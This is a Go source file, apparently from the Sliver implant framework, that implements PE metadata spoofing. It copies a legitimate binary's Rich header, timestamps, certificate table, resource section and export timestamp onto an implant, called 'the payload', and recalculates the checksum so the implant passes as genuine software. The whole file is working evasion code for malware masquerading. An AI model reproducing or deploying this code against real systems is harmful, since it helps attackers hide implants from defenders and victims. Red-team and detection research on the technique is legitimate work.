package generate

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"os"

	"github.com/Binject/debug/pe"
)

const (
	SECTION_NAME = 8
	DEFAULT_CHARACTERISTICS = 0x40000040
)
 
// PE STRUCTURE DEFINITIONS ===================================================
// ============================================================================
type IMAGE_RESOURCE_DIRECTORY struct {
	Characteristics      uint32
	TimeDateStamp        uint32
	MajorVersion         uint16
	MinorVersion         uint16
	NumberOfNamedEntries uint16
	NumberOfIdEntries    uint16
}

type IMAGE_RESOURCE_DIRECTORY_ENTRY struct {
	Name         uint32
	OffsetToData uint32
}

type IMAGE_RESOURCE_DATA_ENTRY struct {
	OffsetToData uint32
	Size         uint32
	CodePage     uint32
	Reserved     uint32
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// CORE METADATA SPOOFING LOGIC ===============================================
// ============================================================================
func SpoofMetadata(targetPath string, spoofData []byte) error {
	if len(spoofData) == 0 {
		return nil
	}

	srcFile, err := pe.NewFile(bytes.NewReader(spoofData))
	if err != nil {
		return fmt.Errorf("failed to parse spoof file: %v", err)
	}
	defer srcFile.Close()

	targetBytes, err := os.ReadFile(targetPath)
	if err != nil {
		return fmt.Errorf("failed to read target file: %v", err)
	}

	tgtFile, err := pe.NewFile(bytes.NewReader(targetBytes))
	if err != nil {
		return fmt.Errorf("failed to parse target file: %v", err)
	}
	defer tgtFile.Close()

	// Rich Header Injection =======================================

	if len(srcFile.RichHeader) > 0 {
		tgtFile.RichHeader = srcFile.RichHeader
		dosSize := uint32(binary.Size(tgtFile.DosHeader))
		stubSize := uint32(0)
		if tgtFile.DosExists {
			stubSize = uint32(binary.Size(tgtFile.DosStub))
		}
		newOffset := dosSize + stubSize + uint32(len(tgtFile.RichHeader))
		newOffset = alignUp(newOffset, 8)
		tgtFile.DosHeader.AddressOfNewExeHeader = newOffset
	}

	// === Comprehensive Timestamp Cloning ===

	timestamp := srcFile.FileHeader.TimeDateStamp
	tgtFile.FileHeader.TimeDateStamp = timestamp

	// === Digital Signature "Luring" ===

	if len(srcFile.CertificateTable) > 0 {
		tgtFile.CertificateTable = srcFile.CertificateTable
	}

	// === Resource Section Injection ===

	srcRsrc := srcFile.Section(".rsrc")
	if srcRsrc != nil {
		srcRsrcData, err := srcRsrc.Data()
		if err != nil {
			return fmt.Errorf("failed to read source .rsrc data: %v", err)
		}

		var rsrcSection *pe.Section
		rsrcSection = tgtFile.Section(".rsrc")

		if rsrcSection != nil {
			sectAlign := uint32(0x1000)
			fileAlign := uint32(0x200)
			switch hdr := tgtFile.OptionalHeader.(type) {
			case *pe.OptionalHeader32:
				sectAlign = hdr.SectionAlignment
				fileAlign = hdr.FileAlignment
			case *pe.OptionalHeader64:
				sectAlign = hdr.SectionAlignment
				fileAlign = hdr.FileAlignment
			}

			rsrcSection.VirtualSize = alignUp(uint32(len(srcRsrcData)), sectAlign)
			rsrcSection.Size = alignUp(uint32(len(srcRsrcData)), fileAlign)

			delta := int64(rsrcSection.VirtualAddress) - int64(srcRsrc.VirtualAddress)

			newRsrcData := make([]byte, len(srcRsrcData))
			copy(newRsrcData, srcRsrcData)
			if err := fixupResourceRVAs(newRsrcData, delta); err != nil {
				return fmt.Errorf("failed to fixup resource RVAs: %v", err)
			}

			updateResourceTimestamp(newRsrcData, timestamp)

			rsrcSection.Replace(bytes.NewReader(newRsrcData), int64(len(newRsrcData)))

			switch hdr := tgtFile.OptionalHeader.(type) {
			case *pe.OptionalHeader32:
				hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = rsrcSection.VirtualSize
			case *pe.OptionalHeader64:
				hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = rsrcSection.VirtualSize
			}

		} else {
			newSection, err := addSection(tgtFile, ".rsrc", uint32(len(srcRsrcData)))
			if err != nil {
				return fmt.Errorf("failed to add .rsrc section: %v", err)
			}

			delta := int64(newSection.VirtualAddress) - int64(srcRsrc.VirtualAddress)
			newRsrcData := make([]byte, len(srcRsrcData))
			copy(newRsrcData, srcRsrcData)
			if err := fixupResourceRVAs(newRsrcData, delta); err != nil {
				return fmt.Errorf("failed to fixup resource RVAs: %v", err)
			}

			updateResourceTimestamp(newRsrcData, timestamp)

			newSection.Replace(bytes.NewReader(newRsrcData), int64(len(newRsrcData)))

			switch hdr := tgtFile.OptionalHeader.(type) {
			case *pe.OptionalHeader32:
				hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = newSection.VirtualAddress
				hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = newSection.VirtualSize
			case *pe.OptionalHeader64:
				hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = newSection.VirtualAddress
				hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = newSection.VirtualSize
			}
		}
	}

	// === Export Directory Timestamp ===
	if err := updateExportTimestamp(tgtFile, timestamp); err != nil {
		// since the payload will not export anything, it is safe to ignore this
		_ = err
	}

	modifiedBytes, err := tgtFile.Bytes()
	if err != nil {
		return fmt.Errorf("failed to serialize modified PE: %v", err)
	}

	// === Checksum Re-calculation ===
	peHeaderOffset := int(binary.LittleEndian.Uint32(modifiedBytes[0x3c:]))
	checksumOffset := peHeaderOffset + 88

	if checksumOffset+4 <= len(modifiedBytes) {
		binary.LittleEndian.PutUint32(modifiedBytes[checksumOffset:], 0)
		csum := calcChecksum(modifiedBytes)
		binary.LittleEndian.PutUint32(modifiedBytes[checksumOffset:], csum)
	}

	if err := os.WriteFile(targetPath, modifiedBytes, 0755); err != nil {
		return fmt.Errorf("failed to write modified binary: %v", err)
	}

	return nil
}

// INTERNAL UTILITIES AND FIXUPS ============================================== 
// ============================================================================
func updateResourceTimestamp(data []byte, timestamp uint32) {
	if len(data) < 16 {
		return
	}
	binary.LittleEndian.PutUint32(data[4:], timestamp)
	traverseUpdateTimestamp(data, 0, timestamp, 0)
}

func traverseUpdateTimestamp(data []byte, offset uint32, timestamp uint32, depth int) {
	if depth > 10 || offset+16 > uint32(len(data)) {
		return
	}

	binary.LittleEndian.PutUint32(data[offset+4:], timestamp)

	var dir IMAGE_RESOURCE_DIRECTORY
	br := bytes.NewReader(data[offset:])
	if err := binary.Read(br, binary.LittleEndian, &dir); err != nil {
		return
	}

	entries := int(dir.NumberOfNamedEntries + dir.NumberOfIdEntries)
	entryOffset := offset + 16

	for i := 0; i < entries; i++ {
		if entryOffset+8 > uint32(len(data)) {
			return
		}

		var entry IMAGE_RESOURCE_DIRECTORY_ENTRY
		brEntry := bytes.NewReader(data[entryOffset:])
		if err := binary.Read(brEntry, binary.LittleEndian, &entry); err != nil {
			return
		}

		if entry.OffsetToData&0x80000000 != 0 {
			subDirOffset := entry.OffsetToData & 0x7FFFFFFF
			traverseUpdateTimestamp(data, subDirOffset, timestamp, depth+1)
		}
		entryOffset += 8
	}
}

func updateExportTimestamp(peFile *pe.File, timestamp uint32) error {
	var va uint32
	var size uint32
	switch hdr := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		va = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
		size = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].Size
	case *pe.OptionalHeader64:
		va = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
		size = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].Size
	}

	if va == 0 || size == 0 {
		return nil
	}

	for _, s := range peFile.Sections {
		if va >= s.VirtualAddress && va < s.VirtualAddress+s.Size {
			secOffset := va - s.VirtualAddress

			data, err := s.Data()
			if err != nil {
				return err
			}

			if uint32(len(data)) > secOffset+8 {
				binary.LittleEndian.PutUint32(data[secOffset+4:], timestamp)
				s.Replace(bytes.NewReader(data), int64(len(data)))
			}
			return nil
		}
	}
	return nil
}

func fixupResourceRVAs(data []byte, delta int64) error {
	return traverseResourceDir(data, 0, delta, 0)
}

func traverseResourceDir(data []byte, offset uint32, delta int64, depth int) error {
	if depth > 10 {
		return nil
	}
	if offset+16 > uint32(len(data)) {
		return errors.New("resource directory out of bounds")
	}

	br := bytes.NewReader(data[offset:])
	var dir IMAGE_RESOURCE_DIRECTORY
	if err := binary.Read(br, binary.LittleEndian, &dir); err != nil {
		return err
	}

	entries := int(dir.NumberOfNamedEntries + dir.NumberOfIdEntries)
	entryOffset := offset + 16

	for i := 0; i < entries; i++ {
		if entryOffset+8 > uint32(len(data)) {
			return errors.New("resource directory entry out of bounds")
		}

		var entry IMAGE_RESOURCE_DIRECTORY_ENTRY
		brEntry := bytes.NewReader(data[entryOffset:])
		if err := binary.Read(brEntry, binary.LittleEndian, &entry); err != nil {
			return err
		}

		if entry.OffsetToData&0x80000000 != 0 {
			subDirOffset := entry.OffsetToData & 0x7FFFFFFF
			if err := traverseResourceDir(data, subDirOffset, delta, depth+1); err != nil {
				return err
			}
		} else {
			dataEntryOffset := entry.OffsetToData
			if dataEntryOffset+16 > uint32(len(data)) {
				return errors.New("resource data entry out of bounds")
			}

			var dataEntry IMAGE_RESOURCE_DATA_ENTRY
			brData := bytes.NewReader(data[dataEntryOffset:])
			if err := binary.Read(brData, binary.LittleEndian, &dataEntry); err != nil {
				return err
			}

			newRVA := uint32(int64(dataEntry.OffsetToData) + delta)
			binary.LittleEndian.PutUint32(data[dataEntryOffset:], newRVA)
		}

		entryOffset += 8
	}

	return nil
}

func calcChecksum(data []byte) uint32 {
	var sum uint64

	for i := 0; i < len(data)/2; i++ {
		sum += uint64(binary.LittleEndian.Uint16(data[i*2:]))
		sum = (sum & 0xffffffff) + (sum >> 32)
	}

	if len(data)%2 != 0 {
		sum += uint64(data[len(data)-1])
		sum = (sum & 0xffffffff) + (sum >> 32)
	}

	sum = (sum & 0xffff) + (sum >> 16)
	sum = sum + (sum >> 16)

	return uint32(sum&0xffff) + uint32(len(data))
}

func alignUp(value, align uint32) uint32 {
	if align == 0 {
		align = 0x1000
	}
	return (value + align - 1) & ^(align - 1)
}

func addSection(peFile *pe.File, name string, size uint32) (*pe.Section, error) {
	var (
		virtualSize       uint32
		virtualAddr       uint32
		rawSize           uint32
		rawPtr            uint32
		origName          [8]byte
		sectionHeaderSize = int64(0x28)
	)

	if len(name) > SECTION_NAME {
		return nil, errors.New("name too long")
	}

	headerOffset := peFile.OptionalHeaderOffset + int64(peFile.SizeOfOptionalHeader) + (int64(peFile.NumberOfSections) * sectionHeaderSize)
	lastSection := peFile.Sections[peFile.NumberOfSections-1]

	var sectionAlignment, fileAlignment uint32
	var sizeOfHeaders uint32

	switch hdr := (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
		sizeOfHeaders = hdr.SizeOfHeaders
	case *pe.OptionalHeader64:
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
		sizeOfHeaders = hdr.SizeOfHeaders
	default:
		return nil, errors.New("unknown optional header type")
	}

	if headerOffset+sectionHeaderSize > int64(sizeOfHeaders) {
		return nil, errors.New("not enough room for an additional section")
	}

	virtualSize = alignUp(size, sectionAlignment)
	virtualAddr = alignUp(lastSection.VirtualAddress+lastSection.VirtualSize, sectionAlignment)
	rawSize = alignUp(size, fileAlignment)
	rawPtr = alignUp(lastSection.Offset+lastSection.Size, fileAlignment)

	switch hdr := (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		hdr.SizeOfImage = virtualAddr + virtualSize
	case *pe.OptionalHeader64:
		hdr.SizeOfImage = virtualAddr + virtualSize
	}

	newSection := new(pe.Section)
	newSection.Name = name
	copy(origName[:], []byte(name+"\x00"))
	newSection.OriginalName = origName
	newSection.Characteristics = DEFAULT_CHARACTERISTICS
	newSection.Size = rawSize
	newSection.VirtualSize = virtualSize
	newSection.VirtualAddress = virtualAddr
	newSection.Offset = rawPtr

	peFile.FileHeader.NumberOfSections += 1
	peFile.Sections = append(peFile.Sections, newSection)
	return newSection, nil
}
